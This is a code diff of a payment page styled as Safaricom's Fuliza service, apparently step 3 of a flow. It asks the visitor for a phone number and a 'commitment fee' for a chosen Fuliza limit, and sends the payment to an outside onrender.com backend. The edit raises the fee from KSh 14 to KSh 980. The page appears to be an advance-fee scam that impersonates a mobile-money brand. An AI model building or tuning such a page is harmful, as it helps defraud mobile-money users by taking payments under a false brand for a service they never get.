@@ -111,7 +111,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
 </head>
 <body>
 
-<header class="top-bar">Safaricom Fuliza — Step 3 of 4</header>
+<header class="top-bar">Safaricom Fuliza — Step 3</header>
 
 <div class="page-wrap">
 
@@ -130,7 +130,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
-        <div class="invoice-amount">1000</div>
+        <div class="invoice-amount">980</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
@@ -173,7 +173,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
     </div>
     <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1,000 Now</button>
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 980 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
@@ -238,7 +238,7 @@ const BACKEND = "https://mpayafrica-server.onrender.com";
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 document.getElementById("limit").innerText = selectedAmount;
 
-const COMMITMENT_FEE = 14;
+const COMMITMENT_FEE = 980;
 
 const phoneInput  = document.getElementById("phone");
 const phoneWrap   = document.getElementById("phoneWrap");
@@ -403,7 +403,7 @@ function startPolling(reference, phone) {
       if (data.status === "pending" || data.status === "not_found") return;
 
       clearInterval(pollInterval);
-
+      
       setSpinner(false);
       setPayBtn(false);
 
